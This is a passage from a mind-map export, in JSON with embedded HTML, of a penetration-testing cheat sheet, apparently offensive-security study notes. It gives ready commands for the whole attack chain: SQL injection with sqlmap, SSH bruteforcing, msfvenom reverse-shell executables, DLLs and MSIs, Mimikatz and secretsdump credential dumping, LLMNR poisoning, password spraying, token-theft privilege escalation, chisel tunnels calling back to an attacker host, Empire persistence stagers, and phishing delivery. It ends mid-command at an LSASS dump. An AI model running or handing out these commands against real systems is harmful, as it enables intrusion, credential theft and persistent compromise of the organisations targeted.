Phase","children":[{"content":"SQLmap","children":[{"content":"<pre data-lines=\"704,707\"><code class=\"language-bash\">sqlmap -u <span class=\"hljs-string\">&quot;http://&lt;target&gt;/vuln?id=1&quot;</span> --batch --dbs\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"704,707"}}],"payload":{"tag":"h3","lines":"703,704"}},{"content":"SearchSploit","children":[{"content":"<pre data-lines=\"713,716\"><code class=\"language-bash\">searchsploit apache 2.4.49\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"713,716"}}],"payload":{"tag":"h3","lines":"712,713"}},{"content":"Exploit-DB","children":[{"content":"If SearchSploit fails, go to <a href=\"https://www.exploit-db.com\">exploit-db.com</a> to hunt manually","children":[],"payload":{"tag":"li","lines":"723,725"}}],"payload":{"tag":"h3","lines":"722,723"}},{"content":"Metasploit Framework","children":[{"content":"Built-in exploits and post modules","children":[],"payload":{"tag":"li","lines":"726,727"}},{"content":"Use with <code>msfvenom</code> for payload creation","children":[],"payload":{"tag":"li","lines":"727,729"}}],"payload":{"tag":"h3","lines":"725,726"}}],"payload":{"tag":"h2","lines":"701,702"}},{"content":"Credentials &amp; Bruteforcing","children":[{"content":"Hydra","children":[{"content":"<pre data-lines=\"734,737\"><code class=\"language-bash\">hydra -l admin -P rockyou.txt ssh://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"734,737"}}],"payload":{"tag":"h3","lines":"733,734"}},{"content":"John the Ripper / Hashcat","children":[{"content":"<pre data-lines=\"743,747\"><code class=\"language-bash\">john hash.txt --wordlist=rockyou.txt\nhashcat -m 1800 -a 0 hash.txt rockyou.txt\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"743,747"}}],"payload":{"tag":"h3","lines":"742,743"}}],"payload":{"tag":"h2","lines":"731,732"}},{"content":"Shell Access &amp; Post Exploitation","children":[{"content":"Netcat (Listener)","children":[{"content":"<pre data-lines=\"757,760\"><code class=\"language-bash\">nc -lvnp 4444\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"757,760"}}],"payload":{"tag":"h3","lines":"756,757"}},{"content":"Mimikatz","children":[{"content":"<pre data-lines=\"766,769\"><code class=\"language-powershell\">Invoke-Mimikatz\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"766,769"}}],"payload":{"tag":"h3","lines":"765,766"}},{"content":"LinPEAS / WinPEAS","children":[{"content":"<pre data-lines=\"776,780\"><code class=\"language-bash\">./linpeas.sh\n./winPEASx64.exe\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"776,780"}}],"payload":{"tag":"h3","lines":"775,776"}},{"content":"LaZagne","children":[{"content":"<pre data-lines=\"786,789\"><code class=\"language-bash\">lazagne all\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"786,789"}}],"payload":{"tag":"h3","lines":"785,786"}},{"content":"Empire (C2)","children":[{"content":"Generate and execute stagers for Windows/Linux","children":[],"payload":{"tag":"li","lines":"795,796"}},{"content":"Maintain persistence via registry, schtasks, WMI","children":[],"payload":{"tag":"li","lines":"796,798"}}],"payload":{"tag":"h3","lines":"794,795"}}],"payload":{"tag":"h2","lines":"754,755"}},{"content":"Internal Network Enumeration","children":[{"content":"Responder","children":[{"content":"<pre data-lines=\"803,806\"><code class=\"language-bash\">responder -I eth0\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"803,806"}}],"payload":{"tag":"h3","lines":"802,803"}},{"content":"CrackMapExec","children":[{"content":"<pre data-lines=\"812,815\"><code class=\"language-bash\">cme smb &lt;target&gt; -u user -p pass\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"812,815"}}],"payload":{"tag":"h3","lines":"811,812"}},{"content":"SMBMap / smbclient","children":[{"content":"<pre data-lines=\"821,825\"><code class=\"language-bash\">smbmap -H &lt;target&gt;\nsmbclient //target/share -U user\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"821,825"}}],"payload":{"tag":"h3","lines":"820,821"}},{"content":"Enum4linux","children":[{"content":"<pre data-lines=\"831,834\"><code class=\"language-bash\">enum4linux -a &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"831,834"}}],"payload":{"tag":"h3","lines":"830,831"}},{"content":"Impacket","children":[{"content":"<pre data-lines=\"841,844\"><code class=\"language-bash\">secretsdump.py &lt;user&gt;:&lt;pass&gt;@&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"841,844"}}],"payload":{"tag":"h3","lines":"839,840"}}],"payload":{"tag":"h2","lines":"800,801"}},{"content":"Privilege Escalation","children":[{"content":"Service Paths (Unquoted/Weak Permissions)","children":[{"content":"<pre data-lines=\"854,858\"><code class=\"language-powershell\">sc qc &lt;service&gt;\nicacls &quot;C:\\Path\\To\\Service.exe&quot;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"854,858"}}],"payload":{"tag":"h3","lines":"853,854"}},{"content":"AlwaysInstallElevated","children":[{"content":"<pre data-lines=\"866,870\"><code class=\"language-powershell\">reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"866,870"}},{"content":"<pre data-lines=\"875,879\"><code class=\"language-powershell\">msfvenom -p windows/exec CMD=calc.exe -f msi &gt; payload.msi\nmsiexec /quiet /qn /i payload.msi\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"875,879"}}],"payload":{"tag":"h3","lines":"865,866"}},{"content":"Insecure Service Permissions","children":[{"content":"<pre data-lines=\"885,888\"><code class=\"language-powershell\">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"885,888"}}],"payload":{"tag":"h3","lines":"884,885"}},{"content":"DLL Hijacking","children":[{"content":"<pre data-lines=\"898,901\"><code class=\"language-bash\">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f dll &gt; backdoor.dll\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"898,901"}}],"payload":{"tag":"h3","lines":"895,896"}},{"content":"Token Impersonation","children":[{"content":"PrintSpoofer","children":[{"content":"<pre data-lines=\"908,911\"><code class=\"language-bash\">PrintSpoofer64.exe -i -c cmd\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"908,911"}}],"payload":{"tag":"h4","lines":"907,908"}},{"content":"JuicyPotato","children":[{"content":"<pre data-lines=\"916,919\"><code class=\"language-bash\">JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"916,919"}}],"payload":{"tag":"h4","lines":"915,916"}},{"content":"RoguePotato","children":[{"content":"<pre data-lines=\"924,927\"><code class=\"language-bash\">RoguePotato.exe -r &lt;attacker&gt; -lport 9999 -e cmd.exe\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"924,927"}}],"payload":{"tag":"h4","lines":"923,924"}}],"payload":{"tag":"h3","lines":"906,907"}},{"content":"WinPEAS / LinPEAS","children":[],"payload":{"tag":"h3","lines":"933,934"}},{"content":"Search for unquoted service paths, writable binaries, SUID","children":[],"payload":{"tag":"h3","lines":"936,937"}},{"content":"Exploit-DB or Local Exploits (dirtycow, kernel overlays, potato family)","children":[],"payload":{"tag":"h3","lines":"938,939"}}],"payload":{"tag":"h2","lines":"851,852"}},{"content":"Pivoting &amp; Lateral Movement","children":[{"content":"Chisel","children":[{"content":"<pre data-lines=\"945,948\"><code class=\"language-bash\">chisel client &lt;attacker&gt;:8000 R:1080:10.0.0.5:22\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"945,948"}}],"payload":{"tag":"h3","lines":"944,945"}},{"content":"SSH Dynamic Socks","children":[{"content":"<pre data-lines=\"954,957\"><code class=\"language-bash\">ssh -D 9050 user@pivot\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"954,957"}}],"payload":{"tag":"h3","lines":"953,954"}},{"content":"Impacket Tools for Lateral Movement:","children":[{"content":"<code>wmiexec.py</code>","children":[],"payload":{"tag":"li","lines":"963,964"}},{"content":"<code>atexec.py</code>","children":[],"payload":{"tag":"li","lines":"964,965"}},{"content":"<code>smbexec.py</code>","children":[],"payload":{"tag":"li","lines":"965,967"}}],"payload":{"tag":"h3","lines":"962,963"}}],"payload":{"tag":"h2","lines":"942,943"}},{"content":"Payloads &amp; Persistence","children":[{"content":"msfvenom","children":[{"content":"<pre data-lines=\"972,975\"><code class=\"language-bash\">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f exe &gt; shell.exe\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"972,975"}}],"payload":{"tag":"h3","lines":"971,972"}},{"content":"Empire","children":[{"content":"Generates PowerShell/HTTP agents","children":[],"payload":{"tag":"li","lines":"981,983"}}],"payload":{"tag":"h3","lines":"980,981"}},{"content":"Sliver / Cobalt Strike (if licensed)","children":[],"payload":{"tag":"h3","lines":"983,984"}}],"payload":{"tag":"h2","lines":"969,970"}},{"content":"Social Engineering Toolkit (SET)","children":[{"content":"<pre data-lines=\"989,992\"><code class=\"language-bash\">setoolkit\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"989,992"}}],"payload":{"tag":"h2","lines":"987,988"}},{"content":"Enumeration Phase","children":[{"content":"Nmap (TCP discovery)","children":[{"content":"<code>nmap -sC -sV -T4 -oA scan &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"1001,1002"}},{"content":"Scan the host with default scripts, service detection, and aggressive timing.","children":[],"payload":{"tag":"li","lines":"1002,1003"}},{"content":"Output lists open ports with banners (e.g.\\ <code>80/tcp open http Apache/2.4.52</code>); filtered hosts show <code>filtered</code>.","children":[],"payload":{"tag":"li","lines":"1003,1004"}},{"content":"Note interesting services and feed the port list to follow&#x2011;up vulnerability scans.","children":[],"payload":{"tag":"li","lines":"1004,1006"}}],"payload":{"tag":"h3","lines":"1000,1001"}},{"content":"Nmap (Vulnerability scripts)","children":[{"content":"<code>nmap --script vuln -p &lt;ports&gt; &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"1007,1008"}},{"content":"Run NSE <em>vuln</em> category scripts against previously discovered ports.","children":[],"payload":{"tag":"li","lines":"1008,1009"}},{"content":"Script output highlights CVEs (e.g.\\ <em>SSL POODLE</em> or <em>samba&#x2011;vuln&#x2011;cve&#x2011;2020&#x2011;1472</em>).","children":[],"payload":{"tag":"li","lines":"1009,1010"}},{"content":"Map positive results to public exploits or Metasploit modules for exploitation.","children":[],"payload":{"tag":"li","lines":"1010,1012"}}],"payload":{"tag":"h3","lines":"1006,1007"}},{"content":"Wireshark","children":[{"content":"<code>wireshark</code>","children":[],"payload":{"tag":"li","lines":"1013,1014"}},{"content":"Launch packet capture to inspect live traffic such as FTP creds, HTTP cookies, or SMB NTLM hashes.","children":[],"payload":{"tag":"li","lines":"1014,1015"}},{"content":"Packet list populates in real time; use filters like <code>http.request</code> or <code>ip.addr == &lt;target&gt;</code> to isolate traffic.","children":[],"payload":{"tag":"li","lines":"1015,1016"}},{"content":"Extract credentials and session tokens, then attempt authenticated access or replay attacks.","children":[],"payload":{"tag":"li","lines":"1016,1018"}}],"payload":{"tag":"h3","lines":"1012,1013"}},{"content":"Maltego","children":[{"content":"<code>maltego</code>","children":[],"payload":{"tag":"li","lines":"1019,1020"}},{"content":"Perform visual OSINT recon to link domains, email addresses, and infrastructure.","children":[],"payload":{"tag":"li","lines":"1020,1021"}},{"content":"Graph view populates with entities connected by transforms; blank graph means transforms returned no data.","children":[],"payload":{"tag":"li","lines":"1021,1022"}},{"content":"Use discovered sub&#x2011;domains and email addresses to craft spear&#x2011;phishing or expand sub&#x2011;domain enumeration.","children":[],"payload":{"tag":"li","lines":"1022,1024"}}],"payload":{"tag":"h3","lines":"1018,1019"}}],"payload":{"tag":"h2","lines":"998,999"}},{"content":"Web Enumeration","children":[{"content":"Gobuster","children":[{"content":"<code>gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt</code>","children":[],"payload":{"tag":"li","lines":"1029,1030"}},{"content":"Brute&#x2011;force directories and files on a web server.","children":[],"payload":{"tag":"li","lines":"1030,1031"}},{"content":"Successful results show status codes (200, 301) and content length; no results may need a bigger wordlist.","children":[],"payload":{"tag":"li","lines":"1031,1032"}},{"content":"Test discovered paths in the browser or proxy to identify admin portals, backups, and file uploads.","children":[],"payload":{"tag":"li","lines":"1032,1034"}}],"payload":{"tag":"h3","lines":"1028,1029"}},{"content":"ffuf (recursive)","children":[{"content":"<code>ffuf -u http://&lt;target&gt;/FUZZ -w /usr/share/wordlists/raft-large-words.txt -recursion</code>","children":[],"payload":{"tag":"li","lines":"1035,1036"}},{"content":"Recursively enumerate nested directories and parameters.","children":[],"payload":{"tag":"li","lines":"1036,1037"}},{"content":"ffuf prints matching URLs and depth level; <code>0 hits</code> indicates directory not present.","children":[],"payload":{"tag":"li","lines":"1037,1038"}},{"content":"Focus manual testing on high&#x2011;priority findings such as <code>/admin</code> or <code>/backup.zip</code>.","children":[],"payload":{"tag":"li","lines":"1038,1040"}}],"payload":{"tag":"h3","lines":"1034,1035"}},{"content":"Nikto","children":[{"content":"<code>nikto -h http://&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"1041,1042"}},{"content":"Run a quick CGI / outdated software check against the web root.","children":[],"payload":{"tag":"li","lines":"1042,1043"}},{"content":"Nikto report lists vulnerabilities like open directories or default creds; &#x201c;0 items&#x201d; means nothing found.","children":[],"payload":{"tag":"li","lines":"1043,1044"}},{"content":"Cross&#x2011;reference vulnerable files with SearchSploit or exploit DB for RCE opportunities.","children":[],"payload":{"tag":"li","lines":"1044,1046"}}],"payload":{"tag":"h3","lines":"1040,1041"}},{"content":"OWASP ZAP / Burp Repeater","children":[{"content":"<code>zap.sh</code> <strong>or</strong> launch Burp Suite","children":[],"payload":{"tag":"li","lines":"1047,1048"}},{"content":"Intercept requests, fuzz parameters, and replay forms for authentication bypass.","children":[],"payload":{"tag":"li","lines":"1048,1049"}},{"content":"Intercepted traffic appears in the proxy history; errors show in the console.","children":[],"payload":{"tag":"li","lines":"1049,1050"}},{"content":"Send suspect requests to Repeater, Intruder, or sqlmap for deeper exploitation.","children":[],"payload":{"tag":"li","lines":"1050,1052"}}],"payload":{"tag":"h3","lines":"1046,1047"}}],"payload":{"tag":"h2","lines":"1026,1027"}},{"content":"Exploitation Phase","children":[{"content":"SQLmap","children":[{"content":"<code>sqlmap -u &quot;http://&lt;target&gt;/vuln?id=1&quot; --batch --dbs</code>","children":[],"payload":{"tag":"li","lines":"1057,1058"}},{"content":"Detect and exploit SQL injection automatically.","children":[],"payload":{"tag":"li","lines":"1058,1059"}},{"content":"sqlmap displays DBMS type and lists databases; if injection fails it returns &#x201c;not injectable&#x201d;.","children":[],"payload":{"tag":"li","lines":"1059,1060"}},{"content":"Dump tables, extract hashes, and reuse creds for lateral movement.","children":[],"payload":{"tag":"li","lines":"1060,1062"}}],"payload":{"tag":"h3","lines":"1056,1057"}},{"content":"SearchSploit","children":[{"content":"<code>searchsploit apache 2.4.49</code>","children":[],"payload":{"tag":"li","lines":"1063,1064"}},{"content":"Locate local proof&#x2011;of&#x2011;concept exploits matching service versions.","children":[],"payload":{"tag":"li","lines":"1064,1065"}},{"content":"Terminal output shows exploit paths or &#x201c;No Results&#x201d;; copy paths with <code>-m</code>.","children":[],"payload":{"tag":"li","lines":"1065,1066"}},{"content":"Compile or adapt the PoC, then run against the target to gain a shell.","children":[],"payload":{"tag":"li","lines":"1066,1068"}}],"payload":{"tag":"h3","lines":"1062,1063"}},{"content":"Metasploit Handler","children":[{"content":"<code>msfconsole -q</code> then <code>use exploit/multi/handler</code>","children":[],"payload":{"tag":"li","lines":"1069,1070"}},{"content":"Spawn a listener for reverse shells or Meterpreter sessions.","children":[],"payload":{"tag":"li","lines":"1070,1071"}},{"content":"Console prints &#x201c;Started reverse TCP handler&#x201d;; a session ID appears on connect.","children":[],"payload":{"tag":"li","lines":"1071,1072"}},{"content":"Interact with the session, escalate privilege, and pivot through Meterpreter modules.","children":[],"payload":{"tag":"li","lines":"1072,1074"}}],"payload":{"tag":"h3","lines":"1068,1069"}}],"payload":{"tag":"h2","lines":"1054,1055"}},{"content":"Credentials &amp; Bruteforcing","children":[{"content":"Hydra (SSH example)","children":[{"content":"<code>hydra -l admin -P rockyou.txt ssh://&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"1079,1080"}},{"content":"Online brute&#x2011;force SSH credentials with wordlist passwords.","children":[],"payload":{"tag":"li","lines":"1080,1081"}},{"content":"Hydra reports &#x201c;login found&#x201d; with valid creds; no hits indicates stronger wordlist needed.","children":[],"payload":{"tag":"li","lines":"1081,1082"}},{"content":"Re&#x2011;use discovered password for SMB, WinRM, or database logins.","children":[],"payload":{"tag":"li","lines":"1082,1084"}}],"payload":{"tag":"h3","lines":"1078,1079"}},{"content":"John / Hashcat","children":[{"content":"<code>john hash.txt --wordlist=rockyou.txt</code>","children":[],"payload":{"tag":"li","lines":"1085,1086"}},{"content":"Crack password hashes offline using wordlists.","children":[],"payload":{"tag":"li","lines":"1086,1087"}},{"content":"Cracked passwords display under &#x201c;password (hash)&#x201d;; empty results signal stronger cracking rules required.","children":[],"payload":{"tag":"li","lines":"1087,1088"}},{"content":"Feed cracked creds back into Hydra or directly authenticate to services.","children":[],"payload":{"tag":"li","lines":"1088,1090"}}],"payload":{"tag":"h3","lines":"1084,1085"}}],"payload":{"tag":"h2","lines":"1076,1077"}},{"content":"Shell Access &amp; Post&#x2011;Exploitation","children":[{"content":"Netcat Listener","children":[{"content":"<code>nc -lvnp 4444</code>","children":[],"payload":{"tag":"li","lines":"1095,1096"}},{"content":"Listen for incoming reverse shells on port 4444.","children":[],"payload":{"tag":"li","lines":"1096,1097"}},{"content":"Terminal shows &#x201c;listening&#x201d; until a connection; on connect, an interactive shell prompt appears.","children":[],"payload":{"tag":"li","lines":"1097,1098"}},{"content":"Stabilize shell (e.g.\\ <code>python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code>) and begin enumeration.","children":[],"payload":{"tag":"li","lines":"1098,1100"}}],"payload":{"tag":"h3","lines":"1094,1095"}},{"content":"Mimikatz (Invoke)","children":[{"content":"<code>Invoke-Mimikatz</code>","children":[],"payload":{"tag":"li","lines":"1101,1102"}},{"content":"Dump Windows credentials, tickets, and hashes from memory.","children":[],"payload":{"tag":"li","lines":"1102,1103"}},{"content":"Output lists plaintext passwords or NTLM hashes; failures may require elevated rights.","children":[],"payload":{"tag":"li","lines":"1103,1104"}},{"content":"Pass&#x2011;the&#x2011;hash or export Kerberos tickets to authenticate on other hosts.","children":[],"payload":{"tag":"li","lines":"1104,1106"}}],"payload":{"tag":"h3","lines":"1100,1101"}},{"content":"LinPEAS / WinPEAS","children":[{"content":"<code>./linpeas.sh</code> <strong>or</strong> <code>winPEASx64.exe</code>","children":[],"payload":{"tag":"li","lines":"1107,1108"}},{"content":"Automated enumeration of privilege escalation vectors.","children":[],"payload":{"tag":"li","lines":"1108,1109"}},{"content":"Color&#x2011;coded report flags writable services, weak permissions, and kernel vulns; no color output suggests minimal findings.","children":[],"payload":{"tag":"li","lines":"1109,1110"}},{"content":"Investigate flagged items (e.g.\\ unquoted service path) and escalate.","children":[],"payload":{"tag":"li","lines":"1110,1112"}}],"payload":{"tag":"h3","lines":"1106,1107"}}],"payload":{"tag":"h2","lines":"1092,1093"}},{"content":"Internal Network Enumeration","children":[{"content":"Responder","children":[{"content":"<code>responder -I eth0</code>","children":[],"payload":{"tag":"li","lines":"1117,1118"}},{"content":"Poison LLMNR/NBNS to capture NetNTLM hashes on the subnet.","children":[],"payload":{"tag":"li","lines":"1118,1119"}},{"content":"Console logs &#x201c;NBT-NS/LLMNR responder started&#x201d; and lists captured credentials; nothing captured indicates no broadcasts.","children":[],"payload":{"tag":"li","lines":"1119,1120"}},{"content":"Crack captured hashes with hashcat then attempt SMB or RDP logins.","children":[],"payload":{"tag":"li","lines":"1120,1122"}}],"payload":{"tag":"h3","lines":"1116,1117"}},{"content":"CrackMapExec (SMB spray)","children":[{"content":"<code>cme smb &lt;target&gt; -u users.txt -p Password123</code>","children":[],"payload":{"tag":"li","lines":"1123,1124"}},{"content":"Spray credentials across SMB hosts for valid combinations.","children":[],"payload":{"tag":"li","lines":"1124,1125"}},{"content":"CME output shows &#x201c;[+] <target> Pwn3d!&#x201d; on success; all failures may require different password list.</target>","children":[],"payload":{"tag":"li","lines":"1125,1126"}},{"content":"Use successful creds with secretsdump or smbclient to pull more data.","children":[],"payload":{"tag":"li","lines":"1126,1128"}}],"payload":{"tag":"h3","lines":"1122,1123"}},{"content":"Impacket secretsdump","children":[{"content":"<code>secretsdump.py &lt;user&gt;:&lt;pass&gt;@&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"1129,1130"}},{"content":"Dump SAM and LSA secrets remotely via SMB/RPC.","children":[],"payload":{"tag":"li","lines":"1130,1131"}},{"content":"Output includes NTLM hashes for local users; &#x201c;access denied&#x201d; indicates insufficient privilege.","children":[],"payload":{"tag":"li","lines":"1131,1132"}},{"content":"Crack or pass the dumped hashes for further compromise.","children":[],"payload":{"tag":"li","lines":"1132,1134"}}],"payload":{"tag":"h3","lines":"1128,1129"}}],"payload":{"tag":"h2","lines":"1114,1115"}},{"content":"Privilege Escalation (Windows examples)","children":[{"content":"AlwaysInstallElevated","children":[{"content":"<code>reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated</code>","children":[],"payload":{"tag":"li","lines":"1139,1140"}},{"content":"Check if MSI packages install with SYSTEM privileges.","children":[],"payload":{"tag":"li","lines":"1140,1141"}},{"content":"Registry returns <code>0x1</code> when enabled; <code>ERROR</code> means key absent.","children":[],"payload":{"tag":"li","lines":"1141,1142"}},{"content":"Craft malicious MSI with msfvenom and install via <code>msiexec /quiet /qn /i payload.msi</code> to gain SYSTEM.","children":[],"payload":{"tag":"li","lines":"1142,1144"}}],"payload":{"tag":"h3","lines":"1138,1139"}},{"content":"Unquoted Service Path","children":[{"content":"<code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /v &quot;C:\\\\Windows&quot; | findstr /v &apos;&quot;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1145,1146"}},{"content":"Identify services whose executable paths contain spaces but lack quotes.","children":[],"payload":{"tag":"li","lines":"1146,1147"}},{"content":"Vulnerable services appear in output; none found indicates other escalation path needed.","children":[],"payload":{"tag":"li","lines":"1147,1148"}},{"content":"Place a payload as the first space&#x2011;broken executable (e.g.\\ <code>C:\\Program.exe</code>) and restart the service to execute as SYSTEM.","children":[],"payload":{"tag":"li","lines":"1148,1150"}}],"payload":{"tag":"h3","lines":"1144,1145"}},{"content":"PrintSpoofer Token Theft","children":[{"content":"<code>PrintSpoofer64.exe -i -c cmd</code>","children":[],"payload":{"tag":"li","lines":"1151,1152"}},{"content":"Leverage SeImpersonatePrivilege to spawn a SYSTEM shell.","children":[],"payload":{"tag":"li","lines":"1152,1153"}},{"content":"Success prints &#x201c;Named pipe connected, launching elevated cmd&#x201d;; privilege errors show exploit blocked.","children":[],"payload":{"tag":"li","lines":"1153,1154"}},{"content":"Dump hashes (<code>reg save HKLM\\SAM sam</code>) or pivot to additional hosts.","children":[],"payload":{"tag":"li","lines":"1154,1156"}}],"payload":{"tag":"h3","lines":"1150,1151"}}],"payload":{"tag":"h2","lines":"1136,1137"}},{"content":"Pivoting &amp; Lateral Movement","children":[{"content":"Chisel Reverse SOCKS","children":[{"content":"<code>chisel client &lt;attacker&gt;:8000 R:1080:10.0.0.5:3389</code>","children":[],"payload":{"tag":"li","lines":"1161,1162"}},{"content":"Create a reverse SOCKS tunnel exposing RDP on 10.0.0.5.","children":[],"payload":{"tag":"li","lines":"1162,1163"}},{"content":"The server logs &#x201c;session established&#x201d;; connecting to localhost:1080 forwards to port&#xa0;3389 of the internal host.","children":[],"payload":{"tag":"li","lines":"1163,1164"}},{"content":"Launch xfreerdp through proxychains to access the remote desktop.","children":[],"payload":{"tag":"li","lines":"1164,1166"}}],"payload":{"tag":"h3","lines":"1160,1161"}},{"content":"SSH Dynamic Proxy","children":[{"content":"<code>ssh -D 9050 user@pivot</code>","children":[],"payload":{"tag":"li","lines":"1167,1168"}},{"content":"Establish a dynamic SOCKS proxy through a pivot host.","children":[],"payload":{"tag":"li","lines":"1168,1169"}},{"content":"SSH session remains open with no output; traffic sent via port&#xa0;9050 is tunneled.","children":[],"payload":{"tag":"li","lines":"1169,1170"}},{"content":"Point proxychains or browser to 127.0.0.1:9050 and enumerate internal web services.","children":[],"payload":{"tag":"li","lines":"1170,1172"}}],"payload":{"tag":"h3","lines":"1166,1167"}}],"payload":{"tag":"h2","lines":"1158,1159"}},{"content":"Payload Generation &amp; Persistence","children":[{"content":"msfvenom","children":[{"content":"<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f exe -o shell.exe</code>","children":[],"payload":{"tag":"li","lines":"1177,1178"}},{"content":"Generate a Windows reverse shell payload.","children":[],"payload":{"tag":"li","lines":"1178,1179"}},{"content":"msfvenom confirms &#x201c;payload size&#x201d; and writes shell.exe; errors indicate bad parameters.","children":[],"payload":{"tag":"li","lines":"1179,1180"}},{"content":"Deploy the payload via writable share, phishing, or service replacement, then connect back to your handler.","children":[],"payload":{"tag":"li","lines":"1180,1182"}}],"payload":{"tag":"h3","lines":"1176,1177"}},{"content":"Empire Listener","children":[{"content":"<code>./empire</code>","children":[],"payload":{"tag":"li","lines":"1183,1184"}},{"content":"Start the Empire C2 framework for PowerShell/HTTP agents.","children":[],"payload":{"tag":"li","lines":"1184,1185"}},{"content":"Console displays &#x201c;listeners&#x201d; prompt; no error on successful start.","children":[],"payload":{"tag":"li","lines":"1185,1186"}},{"content":"Generate a stager, execute on victim, and manage agents for persistence.","children":[],"payload":{"tag":"li","lines":"1186,1188"}}],"payload":{"tag":"h3","lines":"1182,1183"}}],"payload":{"tag":"h2","lines":"1174,1175"}}],"payload":{"tag":"h1","lines":"640,641"}},{"content":"Active Directory","children":[{"content":"Initial Access","children":[{"content":"Null SMB Sessions","children":[{"content":"\n<p data-lines=\"1194,1195\"><code>smbclient -L //&lt;target&gt; -N</code></p>","children":[],"payload":{"tag":"li","lines":"1194,1196"}},{"content":"\n<p data-lines=\"1196,1197\">Check for shared folders: <code>Users</code>, <code>NETLOGON</code>, <code>SYSVOL</code></p>","children":[],"payload":{"tag":"li","lines":"1196,1197"}},{"content":"\n<p data-lines=\"1197,1198\">If accessible, dump content using:</p>","children":[{"content":"<code>smbclient \\\\&lt;target&gt;\\SYSVOL -N</code>","children":[],"payload":{"tag":"li","lines":"1198,1200"}}],"payload":{"tag":"li","lines":"1197,1200"}}],"payload":{"tag":"h3","lines":"1193,1194"}},{"content":"LDAP Anonymous Bind","children":[{"content":"\n<p data-lines=\"1201,1202\"><code>ldapsearch -x -h &lt;target&gt; -s base</code></p>","children":[],"payload":{"tag":"li","lines":"1201,1203"}},{"content":"\n<p data-lines=\"1203,1204\">Extract domain DN &#x2192; use in all LDAP-bound enumeration</p>","children":[],"payload":{"tag":"li","lines":"1203,1204"}},{"content":"\n<p data-lines=\"1204,1205\">Extract domain DN and naming contexts</p>","children":[],"payload":{"tag":"li","lines":"1204,1206"}}],"payload":{"tag":"h3","lines":"1200,1201"}},{"content":"Kerberos AS-REP Roasting (No Preauth)","children":[{"content":"\n<p data-lines=\"1207,1208\"><code>GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip &lt;ip&gt; -no-pass</code></p>","children":[],"payload":{"tag":"li","lines":"1207,1209"}},{"content":"\n<p data-lines=\"1209,1210\">Output = hash file &#x2192; crack offline with hashcat or john</p>","children":[],"payload":{"tag":"li","lines":"1209,1210"}},{"content":"\n<p data-lines=\"1210,1211\">Save hashes &#x2192; crack offline:</p>","children":[{"content":"<code>hashcat -m 18200 hashes.txt rockyou.txt</code>","children":[],"payload":{"tag":"li","lines":"1211,1213"}}],"payload":{"tag":"li","lines":"1210,1213"}}],"payload":{"tag":"h3","lines":"1206,1207"}},{"content":"Username Enumeration","children":[{"content":"<code>kerbrute userenum -d domain.local --dc &lt;ip&gt; users.txt</code>","children":[],"payload":{"tag":"li","lines":"1214,1216"}}],"payload":{"tag":"h3","lines":"1213,1214"}}],"payload":{"tag":"h2","lines":"1191,1192"}},{"content":"Credential Access","children":[{"content":"SMB Login Check","children":[{"content":"<code>crackmapexec smb &lt;ip&gt; -u usernames.txt -p Password123</code>","children":[],"payload":{"tag":"li","lines":"1221,1223"}}],"payload":{"tag":"h3","lines":"1220,1221"}},{"content":"Dump SAM/LSA from Local System","children":[{"content":"<code>reg save HKLM\\SAM sam &amp;&amp; reg save HKLM\\SYSTEM system</code>","children":[],"payload":{"tag":"li","lines":"1224,1225"}},{"content":"<code>secretsdump.py -sam sam -system system LOCAL</code>","children":[],"payload":{"tag":"li","lines":"1225,1227"}}],"payload":{"tag":"h3","lines":"1223,1224"}},{"content":"GPP Password Disclosure","children":[{"content":"\n<p data-lines=\"1228,1229\"><code>findstr /S cpassword \\\\&lt;target&gt;\\SYSVOL\\*.xml</code></p>","children":[],"payload":{"tag":"li","lines":"1228,1230"}},{"content":"\n<p data-lines=\"1230,1231\">Decrypt with GPP-Decrypt</p>","children":[],"payload":{"tag":"li","lines":"1230,1232"}}],"payload":{"tag":"h3","lines":"1227,1228"}},{"content":"Dump from LSASS","children":[{"content":"<code>procdump64.exe -ma lsass.exe 